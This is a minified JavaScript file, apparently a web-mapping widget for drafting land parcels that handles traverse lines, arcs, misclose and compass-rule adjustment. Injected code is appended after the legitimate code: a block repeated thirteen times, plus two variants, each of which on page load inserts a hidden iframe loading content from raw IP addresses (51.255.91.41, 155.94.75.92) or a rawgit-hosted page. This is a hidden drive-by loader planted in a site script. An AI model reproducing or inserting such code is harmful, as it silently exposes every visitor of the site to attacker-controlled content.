this.parcelPointsGraphicsLayer.clear();this._arrayOfAllBoundaryLines=[];this._drawPoint(this.startPoint);t.forEach(this._itemList,f.hitch(this,function(a){""===a.Radius||"0"===a.Radius||0===a.Radius?this._drawStraightLine(a,!1):this._drawArc(a,!1)}));this._setExtentToLayer(this.parcelLinesGraphicsLayer);this.setParcelClosure()},setStartPoint:function(a){var b=new B(4326);g.getProjectedGeometry(a,b,this.geometryService).then(f.hitch(this,function(b){this.startPoint=b;this._startPointForNextLine=f.clone(b);
this._orgStartPointForNextLine=f.clone(b);this.appliedCompassRule=!1;0<this._itemList.length?this._reDrawParcel():(this.parcelPointsGraphicsLayer.clear(),this.parcelLinesGraphicsLayer.clear(),this._arrayOfAllBoundaryLines=[],this._drawPoint(a))}))},_addProjectedGraphic:function(a,b,d,c){var e,h={};h.rowIndex=a.graphics.length;b.attributes=h;4326!==this.map.spatialReference.wkid?g.getProjectedGeometry(b.geometry,this.map.spatialReference,this.geometryService).then(f.hitch(this,function(f){f&&(e=new v(f),
e.setAttributes(h),e.setSymbol(b.symbol),a.add(e),d&&(this._setExtentToLayer(a),c&&this.setParcelClosure()))})):(a.add(b),d&&(this._setExtentToLayer(a),c&&this.setParcelClosure()))},_drawPoint:function(a){a=new v(a,A.fromJson(this.config.pointSymbol));this._addProjectedGraphic(this.parcelPointsGraphicsLayer,a,!1,!1)},_drawLineAndEndPoint:function(a,b,d,c){var e;e=!0;a?(b=g.getLineBetweenPoints(b))?(d=new v(b,A.fromJson(d.LineSymbol.symbol)),this._addProjectedGraphic(this.parcelLinesGraphicsLayer,
d,c,!0),this._startPointForNextLine=f.clone(a),this.appliedCompassRule&&this.parcelLinesGraphicsLayer.graphics.length===this._itemList.length&&(e=!1),e&&this._drawPoint(a)):this._showMessage(this.nls.newTraverse.unableToDrawLineMessage):this._showMessage(this.nls.newTraverse.invalidEndPointMessage)},setInfoForCalculatingMisclose:function(a,b,d){a.startPoint=f.clone(this._orgStartPointForNextLine);a.endpoint=f.clone(b);d=g.getLineBetweenPoints(d);if(a.LineSymbol.type===this.config.BoundaryLineType)for(var c=
0;c<d.paths.length;c++)this._arrayOfAllBoundaryLines.push(d.paths[c]);this._orgStartPointForNextLine=f.clone(b);return a},getArcInfo:function(a,b,d,c){var e,f,n;e=g.getDestinationPoint(a,b,Math.abs(c));f=Math.abs(c)/2;n=g.getDestinationPoint(a,b,f);a={distance:c,radius:d,initBearing:b,chordMidPoint:n,centerAndChordDistance:Math.sqrt(Math.abs(d*d-f*f)),chordEndPoint:e,chordStartPoint:a};b=g.getArcParam(a);b.startAngle=b.startAngle>b.endAngle?b.startAngle-360:b.startAngle;b=g.getPointsForArc(b.startAngle,
b.endAngle,b.centerPoint,d);0===b.length&&(b.push(a.chordStartPoint),b.push(a.chordEndPoint));0>d&&b.reverse();return{endPoint:e,arcGeometryPointsArray:b}},_drawStraightLine:function(a,b){var d,c,e;d=a.BearingConversions.naDD;c=a.LengthConversions.meters;if(a.adjustedValues&&this.adjustPoints){d=a.adjustedValues.adjustedBearing;if("S"===a.BearingConversions.qb3DDRound.charAt(0)||0>a.adjustedValues.lat)d=a.adjustedValues.adjustedBearingNADD;c=a.adjustedValues.adjustedLength;this.appliedCompassRule=
!0}this._rotationAngle&&(d=Number(d)+this._rotationAngle);this._scaleValue&&(c*=this._scaleValue);e=g.getDestinationPoint(this._orgStartPointForNextLine,a.BearingConversions.naDD,a.LengthConversions.meters);d=g.getDestinationPoint(this._startPointForNextLine,d,c);a=this.setInfoForCalculatingMisclose(a,e,[this._orgStartPointForNextLine,e]);this._drawLineAndEndPoint(d,[this._startPointForNextLine,d],a,b)},_drawArc:function(a,b){var d,c,e,f;e=a.BearingConversions.naDD;d=a.RadiusConversions.meters;c=
a.ChordLengthConversions.meters;if(a.adjustedValues&&this.adjustPoints){e=a.adjustedValues.adjustedBearing;if("S"===a.BearingConversions.qb3DDRound.charAt(0)||0>a.adjustedValues.lat)e=a.adjustedValues.adjustedBearingNADD;c=a.adjustedValues.adjustedLength;0>a.ChordLengthConversions.meters&&(c*=-1);this.appliedCompassRule=!0}this._rotationAngle&&(e=Number(e)+this._rotationAngle);this._scaleValue&&(c*=this._scaleValue,d*=this._scaleValue);f=this.getArcInfo(this._orgStartPointForNextLine,a.BearingConversions.naDD,
a.RadiusConversions.meters,a.ChordLengthConversions.meters);a=this.setInfoForCalculatingMisclose(a,f.endPoint,f.arcGeometryPointsArray);d=this.getArcInfo(this._startPointForNextLine,e,d,c);this._drawLineAndEndPoint(d.endPoint,d.arcGeometryPointsArray,a,b)},_setExtentToLayer:function(a,b){0<a.graphics.length&&(a=O.graphicsExtent(a.graphics),!b&&this.map.extent.contains(a)||this.map.setExtent(a.expand(1.5)))},_showMessage:function(a){this.emit("showMessage",a)},updateAccordingToPlanSettings:function(a){this._planSettings=
a;this.bearingNode.set("placeHolder",this._getAbbreviatedUnits(a.directionOrAngleUnits));this.lengthNode.set("placeHolder",this._getAbbreviatedUnits(a.distanceAndLengthUnits));this.radiusNode.set("placeHolder",this._getAbbreviatedUnits(a.distanceAndLengthUnits));this._reGenerateTraverseGrid();this._misCloseDetailsInstance&&(a=this._misCloseDetailsInstance.getMiscloseDetails())&&(a=this._getMiscloseDetailsAccordingToPlanSettings(a),this._misCloseDetailsInstance.updateAccordingToPlanSettings(a))},deActivateDigitizationTool:function(){k.remove(this.screenDigitizationNode,
"esriCTEnableButton")},pointAddedFromDigitization:function(a){var b,d,c,e;e=new B(4326);g.getProjectedGeometry(a,e,this.geometryService).then(f.hitch(this,function(a){b=g.getAngleBetweenPoints(this._startPointForNextLine,a);360===b&&(b=0);d=g.getDistanceBetweenPoints(this._startPointForNextLine,a);c=this.getAngleFromDDTOQB(b);this.bearingNode.set("value",c);"uSSurveyFeet"===this._planSettings.distanceAndLengthUnits&&(d=m.metersToUSSurveyFeet(d));0<this._scaleValue&&(d/=this._scaleValue);this.lengthNode.set("value",
d);this.radiusNode.set("value","");this._addNewItem(!0)}))},getParcelCloseDetails:function(){var a,b,d,c,e,h,n,k,l;c={isClosed:!1,compassStartPoint:null,compassEndPoint:null};e=!0;b=a=d=0;t.forEach(this._itemList,f.hitch(this,function(c,f){c.LineSymbol.type===this.config.BoundaryLineType?(0===d?h=c.startPoint:n=c.endpoint,d++,a+=Math.cos(c.BearingConversions.naDD/180*Math.PI)*c.LengthConversions.meters,b+=Math.sin(c.BearingConversions.naDD/180*Math.PI)*c.LengthConversions.meters):0<f&&0!==d&&(e=!1)}));
1<d&&e&&(k=Math.sqrt(a*a+b*b),k=g.removeNegativeExponents(k),h.x=m.showFixedPlacesAfterDecimal(h.x,6),h.y=m.showFixedPlacesAfterDecimal(h.y,6),n.x=m.showFixedPlacesAfterDecimal(n.x,6),n.y=m.showFixedPlacesAfterDecimal(n.y,6),l=g.getAngleBetweenPoints(n,h),c.isClosed=!0,c.compassStartPoint=h,c.compassEndPoint=n,c.miscloseDistance=k,c.miscloseBearing=l);return c},setParcelClosure:function(a){var b;b=this.getParcelCloseDetails();if(b.isClosed)b=this.getCalculatedMiscloseDetails(b),this._misCloseDetailsInstance.setMiscloseDetails(b),
b.adjustPoints?((this.adjustPoints=this._applyCompassRule(b))&&!this.appliedCompassRule||a)&&this.setStartPoint(this.startPoint):(this.adjustPoints=!1,(this.appliedCompassRule||a)&&this.setStartPoint(this.startPoint));else if(this._misCloseDetailsInstance.setMiscloseDetails(null),this.adjustPoints=!1,this.appliedCompassRule||a)this.appliedCompassRule=!1,this.setStartPoint(this.startPoint)},_getMiscloseDetailsAccordingToPlanSettings:function(a){var b,d;b={};a.BearingConversions&&(b.miscloseBearing=
this._getBearingAccordingToPlanSettings(a.BearingConversions));d=this._getRoundedValue(a.LengthConversions,"MiscloseDistance");b.miscloseDistance=d+" "+this._getAbbreviatedUnits(this._planSettings.distanceAndLengthUnits);a.AreaConversions?(a=a.AreaConversions[this._planSettings.areaUnits],isNaN(parseFloat(a))||(a=parseFloat(a).toFixed(3))):a=0;a=a+" "+this._getAbbreviatedUnits(this._planSettings.areaUnits);b.calculatedArea=a;return b},getCalculatedMiscloseDetails:function(a){var b,d={},c=b=0,c=0,
e=!1;b=a.compassStartPoint;if(a.compassEndPoint&&b){b=a.miscloseDistance;c=a.miscloseBearing;0===b&&(c=0);c=this.getAngleFromDDTOQB(c);if(a=m.categorizeBearingFormat(c,this._planSettings))d.BearingConversions=a;d.AreaConversions=this._getCalculatedArea();a=this._getMiscloseRatioInfo(b);c=a.miscloseRatio;d.miscloseValue=a.miscloseValue;b=m.categorizeLengthFormat(b,"meters");d.LengthConversions=b;b=b[this.config.miscloseSnapDistanceUnit+"Round"];1E5<=c&&(e=!0);d.miscloseRatio=c;d.accuracy=e;d=f.mixin(d,
this._getMiscloseDetailsAccordingToPlanSettings(d));if(0<b&&b<=this.config.miscloseSnapDistance||isFinite(c)&&c>=this.config.miscloseRatioSnap)d.adjustPoints=!0,d.compassCompleteLength=a.compassCompleteLength}return d},_getCalculatedArea:function(){var a,b;this._arrayOfAllBoundaryLines&&0<this._arrayOfAllBoundaryLines.length&&(b=g.getPolygonFromPolyLines(this._arrayOfAllBoundaryLines,!0))&&(a=new v(b),this.parcelPolygonGraphicsLayer.clear(),this.parcelPolygonGraphicsLayer.add(a),a=g.getAreaOfGeometry(b));
return a},_applyCompassRule:function(a){var b,d,c,e,f,g;f=e=0;g={};for(c=0;c<this._itemList.length;c++)d=this._itemList[c],d.LineSymbol.type===this.config.BoundaryLineType&&(""===d.Radius||"0"===d.Radius||0===d.Radius?b=d.LengthConversions.meters:d.ChordLengthConversions&&(b=d.ChordLengthConversions.meters),b=Math.abs(b),d.lat=b*Math.cos(Math.PI/180*d.BearingConversions.naDD),d.dep=b*Math.sin(Math.PI/180*d.BearingConversions.naDD),e+=d.lat,f+=d.dep);g.sumOfLat=e;g.sumOfDep=f;g.sumOfAllLinesLength=
a.compassCompleteLength;for(c=0;c<this._itemList.length;c++)d=this._itemList[c],""===d.Radius||"0"===d.Radius||0===d.Radius?b=d.LengthConversions.meters:d.ChordLengthConversions&&(b=d.ChordLengthConversions.meters),b=Math.abs(b),d.LineSymbol.type===this.config.BoundaryLineType&&(d.adjustedValues=this._adjustBearingAndDistance(d.lat,d.dep,b,g));for(c=b=a=0;c<this._itemList.length;c++)d=this._itemList[c],d.LineSymbol.type===this.config.BoundaryLineType&&(a+=parseFloat(d.adjustedValues.lat.toFixed(2)),
b+=parseFloat(d.adjustedValues.dep.toFixed(2)),a=parseFloat(a.toFixed(2)),b=parseFloat(b.toFixed(2)));return 0===parseInt(a,10)&&0===parseInt(b,10)?!0:!1},_adjustBearingAndDistance:function(a,b,d,c){var e,f;e={};a=parseFloat(a.toFixed(6));b=parseFloat(b.toFixed(6));d=parseFloat(d.toFixed(6));f=-c.sumOfLat/c.sumOfAllLinesLength*d;d*=-c.sumOfDep/c.sumOfAllLinesLength;f=parseFloat(f.toFixed(6));d=parseFloat(d.toFixed(6));b+=d;a=parseFloat((a+f).toFixed(6));b=parseFloat(b.toFixed(6));f=Math.sqrt(Math.pow(a,
2)+Math.pow(b,2));d=Math.atan(b/a);d=parseFloat(d.toFixed(6));e.lat=a;e.dep=b;e.adjustedLength=f;e.adjustedBearing=180/Math.PI*d;a=m.categorizeBearingFormat(e.adjustedBearing,{directionOrAngleType:"southAzimuth",directionOrAngleUnits:"decimalDegree"});e.adjustedBearingNADD=a.naDD;return e},_getMiscloseRatioInfo:function(a){var b,d=b=0,c;c=0;this._arrayOfAllBoundaryLines&&0<this._arrayOfAllBoundaryLines.length&&(b=g.getPolyLineFromPaths(this._arrayOfAllBoundaryLines),b=g.getLengthOfGeometry(b),0<b&&
(d=1/(a/b),10>d?d=0:1E5>d&&(c=parseInt(d,10),d="1:"+parseInt(d,10))));return{miscloseRatio:d,miscloseValue:c,compassCompleteLength:b}},getAngleFromDDTOQB:function(a){var b,d;d=f.clone(this._planSettings);d.directionOrAngleType="northAzimuth";d.directionOrAngleUnits="decimalDegree";(a=m.categorizeBearingFormat(a,d))&&(b="degreeMinuteSeconds"===this._planSettings.directionOrAngleUnits?a.qb3DMS:a.qb3DD);return b},initEditing:function(a,b,d){var c,e,h,k,l;this._planInfoInstance.setParcelInformation(this.polygonDeleteArr);
c=this.polygonDeleteArr[0].attributes[this.config.polygonLayer.rotation.name];(h=this.polygonDeleteArr[0].attributes[this.config.polygonLayer.scale.name])||(h=1);e=this.polygonDeleteArr[0].attributes[this.config.polygonLayer.statedArea.name];this._parcelToolInstance.setRotation(c);this._parcelToolInstance.setScale(h);null!==e&&void 0!==e&&this._misCloseDetailsInstance.traverseStatedArea.set("value",e);h=[];k=g.getUnitValueForSR(d);l=f.clone(this._planSettings);l.directionOrAngleType="northAzimuth";
l.directionOrAngleUnits="decimalDegree";for(d=0;d<b.features.length;d++){c={};c.Bearing=b.features[d].attributes[this.config.polylineLayer.bearing.name];c.BearingConversions=m.categorizeBearingFormat(c.Bearing,l);c.Bearing=this._getBearingAccordingToPlanSettings(c.BearingConversions,!0);c.Length=b.features[d].attributes[this.config.polylineLayer.distance.name];null!==c.Length&&""!==c.Length&&(c.LengthConversions=this._validateLength(c.Length,k),c.Length=c.LengthConversions[this._planSettings.distanceAndLengthUnits]);
if(e=this.getLineSymbolForType(b.features[d].attributes[this.config.polylineLayer.lineType.name]))c.LineSymbol=e;c.Radius=b.features[d].attributes[this.config.polylineLayer.radius.name];null!==c.Radius&&""!==c.Radius?(c.RadiusConversions=this._validateLength(c.Radius,k),c.Radius=c.RadiusConversions[this._planSettings.distanceAndLengthUnits],c.ArcLength=b.features[d].attributes[this.config.polylineLayer.arcLength.name],null!==c.ArcLength&&""!==c.ArcLength&&(c.ArcLengthConversions=this._validateLength(c.ArcLength,
k),c.ArcLength=c.ArcLengthConversions[this._planSettings.distanceAndLengthUnits]),c.ChordLength=b.features[d].attributes[this.config.polylineLayer.chordLength.name],null!==c.ChordLength&&""!==c.ChordLength&&(c.ChordLengthConversions=this._validateLength(c.ChordLength,k),c.ChordLength=c.ChordLengthConversions[this._planSettings.distanceAndLengthUnits]),"radiusAndArcLength"===this._planSettings.circularCurveParameters?(c.Length=c.ArcLength,c.LengthConversions=f.clone(c.ArcLengthConversions)):(c.Length=
c.ChordLength,c.LengthConversions=f.clone(c.ChordLengthConversions))):(c.Radius="",c.RadiusConversions=null);h.push(c)}this._itemList=h;this._reGenerateTraverseGrid();this._showHideTraverseTools();this.setStartPoint(a);this.setBoundaryLineSymbol()},setBoundaryLineSymbol:function(){this._symbolSelector&&t.some(this.config.lineTypes,f.hitch(this,function(a){if(this.config.BoundaryLineType===a.type)return this._symbolSelector.selectSymbol(a),!1}))},getLineSymbolForType:function(a){var b;t.some(this.config.lineTypes,
f.hitch(this,function(d){if(d.type===a)return b=f.clone(d),!0}));return b},deactivateParcelTools:function(){this._parcelToolInstance.disableRotating();this._parcelToolInstance.disableScaling()},clearAll:function(){this.parcelLinesGraphicsLayer.clear();this.parcelPointsGraphicsLayer.clear();this.parcelPolygonGraphicsLayer.clear();this._resetEntryRow();this._dndContainer.clearItems();l.empty(this.traverseGrid);this._itemList=[];this._nodes=[];this._showHideTraverseTools();this._orgStartPointForNextLine=
this._startPointForNextLine=this.startPoint=null;this._rotationAngle=0;this._scaleValue=1;this._symbolSelector.setDefault();k.remove(this.screenDigitizationNode,"esriCTEnableButton");this._parcelToolInstance.resetTools();this.deactivateParcelTools();this._misCloseDetailsInstance.setMiscloseDetails(null);this._arrayOfAllBoundaryLines=[];this.polygonDeleteArr=[];this.polylineDeleteArr=[];this.domNode.scrollTop=0;this._planInfoInstance.resetValues();this._misCloseDetailsInstance.traverseStatedArea.set("value",
null);this.closePopup()},_showParcelPopup:function(a){var b,d,c=[];b=new Q;d=this._pointToExtent(a.mapPoint,8);c=t.filter(this.parcelLinesGraphicsLayer.graphics,function(a){return d.intersects(a.geometry)});c[0]?(this._createPopupContent(a,c[0]),b.resolve(!0)):(this.closePopup(),b.resolve(!1));return b},_getAbbreviatedUnits:function(a){return window.jimuNls.units[a+"Abbr"]},_pointToExtent:function(a,b){var d;d=this.map.extent.getWidth()/this.map.width;b*=d;return new R(a.x-b,a.y-b,a.x+b,a.y+b,this.map.spatialReference)},
_createPopupContent:function(a,b){var d,c,e;if(e=this._itemList[b.attributes.rowIndex])d=l.create("div",{"class":"esriCTParcelInfoPopup "+this.baseClass},null),c=l.create("div",{"class":"esriCTLabelRows"},d),this._createFieldLabels(c,this.nls.traverseSettings.bearingLabel),this._createFieldLabels(c,this.nls.traverseSettings.lengthLabel),this._createFieldLabels(c,this.nls.traverseSettings.radiusLabel),b=l.create("div",{"class":"esriCTRowContainer esriCTRow",rowIndex:b.attributes.rowIndex},d),this._createFieldInputs(b,
this._getBearingAccordingToPlanSettings(e.BearingConversions),"esriCTBearingRow",!0),(c=e.RadiusConversions)?(c=this._getRoundedValue(e.RadiusConversions,"Radius"),e="radiusAndArcLength"===this._planSettings.circularCurveParameters?this._getRoundedValue(e.ArcLengthConversions,"Length"):this._getRoundedValue(e.ChordLengthConversions,"Length")):(c="",e=this._getRoundedValue(e.LengthConversions,"Length")),this._createFieldInputs(b,e,"esriCTLengthRow",!0),this._createFieldInputs(b,c,"esriCTRadiusRow",
!0),y.position(this.traverseEntryNode)&&y.position(this.traverseEntryNode).w&&(e=y.position(this.traverseEntryNode).w-42,z.set(this._popupDialog.domNode,"width",e+"px")),this._popupDialog.setContent(d),this._popupCoords={pageX:a.pageX,pageY:a.pageY},this._openPopup(a)},_openPopup:function(a){z.set(this._popupDialog.domNode,"opacity",.9);C.open({popup:this._popupDialog,x:a.pageX,y:a.pageY})},closePopup:function(){this._popupDialog&&C.close(this._popupDialog)},_createFieldLabels:function(a,b){l.create("div",
{innerHTML:b,title:b,"class":"esriCTParcelInfoLabels"},a)},_createTooltip:function(){this._popupDialog=new P({"class":"esriCTEditParcelDialog"});this._popupDialog.startup()},validateNumericField:function(a,b){var d,c=/^[-+]?[0-9]+\.[0-9]+$/,e=/^[-+]?[0-9]+$/;a=f.trim(a);switch(b){case "esriFieldTypeSmallInteger":b=parseInt(a,10);d=a.match(e)&&-32768<=b&&32767>=b&&0!==a.length?!0:!1;break;case "esriFieldTypeInteger":b=parseInt(a,10);d=a.match(e)&&-2147483648<=b&&2147483647>=b&&0!==a.length?!0:!1;break;
case "esriFieldTypeSingle":b=parseFloat(a);d=(a.match(e)||a.match(c))&&b>=-3.4*Math.pow(10,38)&&b<=1.2*Math.pow(10,38)&&0!==a.length?!0:!1;break;case "esriFieldTypeDouble":b=parseFloat(a),d=(a.match(e)||a.match(c))&&b>=-2.2*Math.pow(10,308)&&b<=1.8*Math.pow(10,38)&&0!==a.length?!0:!1}return d}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});